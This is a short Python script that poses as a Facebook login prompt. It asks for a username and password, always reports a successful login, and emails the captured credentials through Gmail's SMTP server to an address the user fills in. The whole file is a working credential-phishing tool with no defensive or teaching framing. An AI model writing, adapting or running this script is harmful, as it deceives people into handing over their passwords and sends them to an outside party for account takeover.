import smtplib
from email.message import EmailMessage

# Facebook-like logo display
print("""
  ______           _                 _    
 |  ____|         | |               | |   
 | |__   _ __   __| | ___  _ __ ___ | | __
 |  __| | '_ \ / _` |/ _ \| '_ ` _ \| |/ /
 | |__ _| | | | (_| | (_) | | | | | |   < 
 |______|_| |_|\__,_|\___/|_| |_| |_|_|\_\\

              FaceBook Login
""")

# User input
input_username = input("Enter username: ")
input_password = input("Enter password: ")

# Always say login is successful
print(f"✅ Login successful! Welcome, {input_username}")

# Send email with the login attempt
def send_email(username, password):
    msg = EmailMessage()
    msg["Subject"] = "Login Attempt Info"
    msg["From"] = "your_gmail@gmail.com"  # Replace with your email
    msg["To"] = "someone@gmail.com"
    msg.set_content(f"Username: {username}\nPassword: {password}")

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login("your@gmail.com", "yor _google_auth")  # Replace with real info
            smtp.send_message(msg)
            
    except Exception as e:
        print("❌ Email failed:", e)

# Call the email function
send_email(input_username, input_password)
